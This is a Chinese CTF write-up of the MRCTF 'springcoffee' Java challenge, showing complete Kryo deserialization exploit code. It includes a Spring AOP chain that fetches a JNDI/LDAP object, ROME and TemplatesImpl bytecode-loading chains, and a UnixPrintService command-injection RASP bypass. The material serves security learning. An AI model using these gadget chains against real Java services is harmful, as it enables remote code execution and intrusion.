# MRCTF-java部分

## 0x01 springcoffee

### 1. 题目

拿到源码之后，不用多说的只有两个控制器是其中最关键的地方<kbd>/order</kbd><kbd>/demo</kbd>,其他的地方并没有什么太多的利用点。

其中`/order`是触发反序列化的地方，`/demo`是`set`可以修改kryo中的一些配置。

### 2. 做题

经典的一个百度搜索+狗狗搜索，只有两篇还算的是有用的链接。

> 1.https://cloud.tencent.com/developer/article/1624416
>
> 2.https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96

然后还有marshalsec的一段话

![image-20220426150614229](https://c.img.dasctf.com/images/2022426/1650956782728-ec6d5807-a3fa-4693-9495-b0ef9e87cb1f.png)

​	上面这么多的信息是不是已经有一点眼花缭乱了，没关系，下面我来给大家整理一下

```
1.Kryo 默认的配置只允许反序列化那些默认的有空参构造函数的类，(据说这样可以抵制许多的gadget)，但是里面也提供其他的支持(org.objenesis.strategy.StdInstantiatorStrategy)
2.可以利用的payloads
	BeanComp ==>commutil
	SpringBFAdv ==> spring aop (这个是通了)
	ROME ==> (有依赖)
```

本地因为懒，没有去翻mar的这个pdf文档，所以在比赛的时候也没有去找到ROME这条链子，所以在比赛的时候当时不出网也就没有继续做下去了(其实是太懒了，当时去抖了~~~~).

下面放一下SpringBFAdv的exp(不出网就没法利用了，这个主要是打jndi的)

```java
public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
    public static BeanFactory makeJNDITrigger (String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }
    public static Object makeBeanFactoryTriggerBFPA ( String name, BeanFactory bf ) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(name);
        DefaultBeanFactoryPointcutAdvisor c = new DefaultBeanFactoryPointcutAdvisor();
        c.setAdviceBeanName(name);
        c.setBeanFactory(bf);
        return makeMap(pcadv, c);
    }
    public  byte[] genpayload1()throws  Exception{
        String jndiUrl = "ldap://localhost:1389/obj";
        final Object o = makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try ( Output output = new Output(bos) ) {
            this.kryo.writeClassAndObject(output, o);
        }
        byte[] bytes = bos.toByteArray();
        return Base64.getEncoder().encode(bytes);

    }
```

![image-20220426160311823](https://c.img.dasctf.com/images/2022426/1650960191749-530973b0-300a-4726-8596-5dc570531fb3.png)

一个小细节，相信大家都知道了。

### 3. 正确解法

ROME链子不出网，肯定就要糊一个加载字节码的东西出来。`TemplatesImpl`，他来了

先赛一个exp出来

```java
public byte[] genpayload() throws  Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {genByteCode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        ToStringBean item = new ToStringBean(Templates.class, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        HashMap o = makeMap(root, " ");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try ( Output output = new Output(bos) ) {
            this.kryo.writeClassAndObject(output, o);
        }
        byte[] bytes = bos.toByteArray();
        return Base64.getEncoder().encode(bytes);
    }
```

然后就报错了

![image-20220426204307520](https://c.img.dasctf.com/images/2022426/1650976995489-6f72ab36-5146-4a1d-9a25-cad9445d5ed6.png)

这是和虎符一样的空指针报错，处理方法和虎符是一样的。signedObject

```java
 TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        ToStringBean item = new ToStringBean(Templates.class, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        setFieldValue(badAttributeValueExpException,"val",root);
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject so = null;
        so = new SignedObject(badAttributeValueExpException, privateKey, signingEngine);
        ObjectBean delegate = new ObjectBean(SignedObject.class, so);
        ObjectBean  ob = new ObjectBean(ObjectBean.class, delegate);
        HashMap o = makeMap(ob, ob);
```

这是🐉哥的

```java
//        ObjectBean delegate = new ObjectBean(Templates.class, obj);
//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
//        HashMap<Object, Object> hashmap = makeMap(root,root);
//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
//        keyPairGenerator.initialize(1024);
//        KeyPair keyPair = keyPairGenerator.genKeyPair();
//        PrivateKey privateKey = keyPair.getPrivate();
//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);
//
//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);
//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);
//        HashMap<Object, Object> hashmap1 = makeMap(root1,root1);
```

感觉优雅一丢丢。然后后面的就懂得都懂了。这里就已经可以任意代码执行了（绕rasp就不说了。

> rasp那个的绕过，一个就是直接
>
> 第二个就是`UnixPrintService`的get链子调用

```java
//这个糊到ROME链子里面问题不大把
Constructor<UnixPrintService> declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);
declaredConstructor.setAccessible(true);
ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,
declaredConstructor.newInstance(";open -na Calculator"));
ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
HashMap<Object, Object> map = JDKUtil.makeMap(root, root);
//
ByteArrayOutputStream os = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(os);
HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
sf.setAllowNonSerializable(true);
output.setSerializerFactory(sf);
output.writeObject(map);
output.getBytesOutputStream().flush();
output.completeMessage();
output.close();
System.out.println(new String(Base64.getEncoder().encode(os.toByteArray())));
```

`javaagent`注入内存马

### 4.参考

> 1.https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/#FactoryTransformer
>
> 2.https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&mid=2247484132&idx=1&sn=55fdb98a839bd2e0a8d14934a0fef757&chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&mpshare=1&scene=22&srcid=0425FBJKvWlNewXNv00ett0i&sharer_sharetime=1650892131994&sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd
>
> 3.https://blog.wm-team.cn/index.php/archives/18/

### 5. 代码

```java
package com.mrtf.springcoffee.model;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;
import com.mrtf.springcoffee.shell.MSpringJNIController;
import com.mrtf.springcoffee.util.Reflections;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.logging.impl.NoOpLog;
import org.json.JSONObject;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

import static com.mrtf.springcoffee.util.Reflections.setFieldValue;

public class Main {
    protected Kryo kryo = new Kryo();

    public Message order(CoffeeRequest coffee) {
        if (coffee.extraFlavor != null) {
            ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor));
            Input input = new Input(bas);
            ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input);
            return new Message(200, flavor.getName());
        } else if (coffee.espresso > 0.5D) {
            return new Message(200, "DOPPIO");
        } else if (coffee.hotWater > 0.5D) {
            return new Message(200, "AMERICANO");
        } else if (coffee.milkFoam > 0.0D && coffee.steamMilk > 0.0D) {
            return coffee.steamMilk > coffee.milkFoam ? new Message(200, "CAPPUCCINO") : new Message(200, "Latte");
        } else {
            return coffee.espresso > 0.0D ? new Message(200, "Espresso") : new Message(200, "empty");
        }
    }
    public Message demoFlavor(String raw) throws Exception {
        System.out.println(raw);
        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            this.kryo = new Kryo();
            Method[] var3 = this.kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                Method setMethod = var3[var5];
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                p1 = Class.forName((String)p1).newInstance();
                                setMethod.invoke(this.kryo, p1);
                            } catch (Exception var9) {
                                var9.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(this.kryo, p1);
                        }
                    } catch (Exception var10) {
                    }
                }
            }
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        this.kryo.register(Mocha.class);
        this.kryo.writeClassAndObject(output, new Mocha());
        output.flush();
        output.close();
        return new Message(200, "Mocha!", Base64.getEncoder().encode(bos.toByteArray()));
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static BeanFactory makeJNDITrigger (String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        setFieldValue(bf, "logger", new NoOpLog());
        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }
    public static Object makeBeanFactoryTriggerBFPA ( String name, BeanFactory bf ) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(name);
        DefaultBeanFactoryPointcutAdvisor c = new DefaultBeanFactoryPointcutAdvisor();
        c.setAdviceBeanName(name);
        c.setBeanFactory(bf);
        return makeMap(pcadv, c);
    }
    public  byte[] genpayload1()throws  Exception{
        String jndiUrl = "ldap://localhost:1389/obj";
        final Object o = makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try ( Output output = new Output(bos) ) {
            this.kryo.writeClassAndObject(output, o);
        }
        byte[] bytes = bos.toByteArray();
        return Base64.getEncoder().encode(bytes);

    }

    public static byte[] genByteCode() throws CannotCompileException, IOException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "System.out.println(\"whoops!\");java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[] classBytes = cc.toBytecode();
        return classBytes;
    }
    public byte[] genpayload() throws  Exception{
        TemplatesImpl obj = new TemplatesImpl();
//        final byte[] bytes1 = ClassPool.getDefault().get(ysoserial.payloads.test2.class.getName()).toBytecode();
        setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        ToStringBean item = new ToStringBean(Templates.class, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        setFieldValue(badAttributeValueExpException,"val",root);
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject so = null;
        so = new SignedObject(badAttributeValueExpException, privateKey, signingEngine);
        ObjectBean delegate = new ObjectBean(SignedObject.class, so);
        ObjectBean  ob = new ObjectBean(ObjectBean.class, delegate);
        HashMap o = makeMap(ob, ob);
//        ObjectBean delegate = new ObjectBean(Templates.class, obj);
//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
//        HashMap<Object, Object> hashmap = makeMap(root,root);
//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
//        keyPairGenerator.initialize(1024);
//        KeyPair keyPair = keyPairGenerator.genKeyPair();
//        PrivateKey privateKey = keyPair.getPrivate();
//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);
//
//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);
//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);
//        HashMap<Object, Object> hashmap1 = makeMap(root1,root1);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try ( Output output = new Output(bos) ) {
            this.kryo.writeClassAndObject(output, o);
        }
        byte[] bytes = bos.toByteArray();
        return Base64.getEncoder().encode(bytes);
    }
    public static void main(String[] args) throws Exception {

        Main main = new Main();
        main.demoFlavor("{\n" +
                "        \"polish\":True,\n" +
                "        \"References\":True,\n" +
                "        \"RegistrationRequired\":False,\n" +
                "        \"InstantiatorStrategy\":\"org.objenesis.strategy.StdInstantiatorStrategy\",\n" +
                "    }");
        byte[] bytes = main.genpayload();
        String s = new String(bytes);
        CoffeeRequest coffee = new CoffeeRequest();
        JSONObject jsonObject = new JSONObject(coffee);
        coffee.setExtraFlavor(s);
        System.out.println(new String(bytes));
//        main.order(coffee);
    }
}

```

util

```java
package com.mrtf.springcoffee.util;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

import sun.reflect.ReflectionFactory;


@SuppressWarnings ( "restriction" )
public class Reflections {

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }


    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }


    public static Object getFieldValue ( final Object obj, final String fieldName ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }


    public static Constructor<?> getFirstCtor ( final String name ) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[ 0 ];
        ctor.setAccessible(true);
        return ctor;
    }


    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }


    @SuppressWarnings ( {
            "unchecked"
    } )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

}

```

